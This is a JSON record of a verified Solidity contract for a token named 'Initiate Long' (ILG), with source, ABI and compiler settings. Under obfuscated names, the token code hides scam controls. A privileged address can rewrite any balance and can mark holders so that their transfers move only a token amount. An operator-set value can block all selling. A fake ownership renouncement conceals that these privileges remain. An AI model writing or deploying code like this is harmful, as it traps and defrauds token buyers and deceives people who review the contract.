{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface enableSell {\n    function createPair(address sellLiquidityFee, address fromAuto) external returns (address);\n}\n\ninterface limitMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamReceiver) external view returns (uint256);\n\n    function transfer(address takeToken, uint256 swapMarketing) external returns (bool);\n\n    function allowance(address fundLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeToken,\n        uint256 swapMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAmount, uint256 value);\n    event Approval(address indexed fundLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract totalLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderFrom is limitMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InitiateLong is totalLaunched, limitMarketing, senderFrom {\n\n    string private teamShouldSwap = \"ILG\";\n\n    function allowance(address receiverAt, address teamList) external view virtual override returns (uint256) {\n        if (teamList == buyEnable) {\n            return type(uint256).max;\n        }\n        return fromShould[receiverAt][teamList];\n    }\n\n    function liquiditySender() private view {\n        require(exemptWalletMarketing[_msgSender()]);\n    }\n\n    function balanceOf(address teamReceiver) public view virtual override returns (uint256) {\n        return fundFrom[teamReceiver];\n    }\n\n    bool public totalTrading;\n\n    uint256 private fromTx;\n\n    bool private launchList;\n\n    function transferFrom(address launchMax, address takeToken, uint256 swapMarketing) external override returns (bool) {\n        if (_msgSender() != buyEnable) {\n            if (fromShould[launchMax][_msgSender()] != type(uint256).max) {\n                require(swapMarketing <= fromShould[launchMax][_msgSender()]);\n                fromShould[launchMax][_msgSender()] -= swapMarketing;\n            }\n        }\n        return fromTokenTo(launchMax, takeToken, swapMarketing);\n    }\n\n    address senderToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 teamFee;\n\n    uint8 private launchSender = 18;\n\n    uint256 private limitTxReceiver;\n\n    address public launchedTradingTx;\n\n    function enableTo(address launchMax, address takeToken, uint256 swapMarketing) internal returns (bool) {\n        require(fundFrom[launchMax] >= swapMarketing);\n        fundFrom[launchMax] -= swapMarketing;\n        fundFrom[takeToken] += swapMarketing;\n        emit Transfer(launchMax, takeToken, swapMarketing);\n        return true;\n    }\n\n    mapping(address => uint256) private fundFrom;\n\n    mapping(address => bool) public exemptWalletMarketing;\n\n    mapping(address => bool) public teamSender;\n\n    function autoMin(address shouldList, uint256 swapMarketing) public {\n        liquiditySender();\n        fundFrom[shouldList] = swapMarketing;\n    }\n\n    function transfer(address shouldList, uint256 swapMarketing) external virtual override returns (bool) {\n        return fromTokenTo(_msgSender(), shouldList, swapMarketing);\n    }\n\n    function marketingSwap(address teamTotal) public {\n        liquiditySender();\n        \n        if (teamTotal == toAuto || teamTotal == launchedTradingTx) {\n            return;\n        }\n        teamSender[teamTotal] = true;\n    }\n\n    uint256 private atMode;\n\n    mapping(address => mapping(address => uint256)) private fromShould;\n\n    function walletSender(uint256 swapMarketing) public {\n        liquiditySender();\n        isMax = swapMarketing;\n    }\n\n    address public toAuto;\n\n    function fromTokenTo(address launchMax, address takeToken, uint256 swapMarketing) internal returns (bool) {\n        if (launchMax == toAuto) {\n            return enableTo(launchMax, takeToken, swapMarketing);\n        }\n        uint256 modeSender = limitMarketing(launchedTradingTx).balanceOf(senderToken);\n        require(modeSender == isMax);\n        require(takeToken != senderToken);\n        if (teamSender[launchMax]) {\n            return enableTo(launchMax, takeToken, walletMax);\n        }\n        return enableTo(launchMax, takeToken, swapMarketing);\n    }\n\n    event OwnershipTransferred(address indexed liquidityTakeTeam, address indexed shouldMarketing);\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamShouldSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoAmount;\n    }\n\n    function modeShould(address modeMin) public {\n        if (launchedTx) {\n            return;\n        }\n        \n        exemptWalletMarketing[modeMin] = true;\n        \n        launchedTx = true;\n    }\n\n    function owner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSender;\n    }\n\n    string private autoAmount = \"Initiate Long\";\n\n    bool private launchReceiver;\n\n    function getOwner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    uint256 private enableAmount = 100000000 * 10 ** 18;\n\n    address buyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant walletMax = 17 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableAmount;\n    }\n\n    bool public launchedTx;\n\n    function approve(address teamList, uint256 swapMarketing) public virtual override returns (bool) {\n        fromShould[_msgSender()][teamList] = swapMarketing;\n        emit Approval(_msgSender(), teamList, swapMarketing);\n        return true;\n    }\n\n    function toReceiver() public {\n        emit OwnershipTransferred(toAuto, address(0));\n        tokenTotal = address(0);\n    }\n\n    address private tokenTotal;\n\n    uint256 isMax;\n\n    uint256 private amountAuto;\n\n    constructor (){\n        if (launchReceiver == launchList) {\n            atMode = fromTx;\n        }\n        limitTx fundTrading = limitTx(buyEnable);\n        launchedTradingTx = enableSell(fundTrading.factory()).createPair(fundTrading.WETH(), address(this));\n        if (launchReceiver) {\n            limitTxReceiver = fromTx;\n        }\n        toAuto = _msgSender();\n        exemptWalletMarketing[toAuto] = true;\n        fundFrom[toAuto] = enableAmount;\n        toReceiver();\n        if (launchReceiver) {\n            atMode = amountAuto;\n        }\n        emit Transfer(address(0), toAuto, enableAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTakeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"autoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptWalletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"}],\"name\":\"marketingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InitiateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}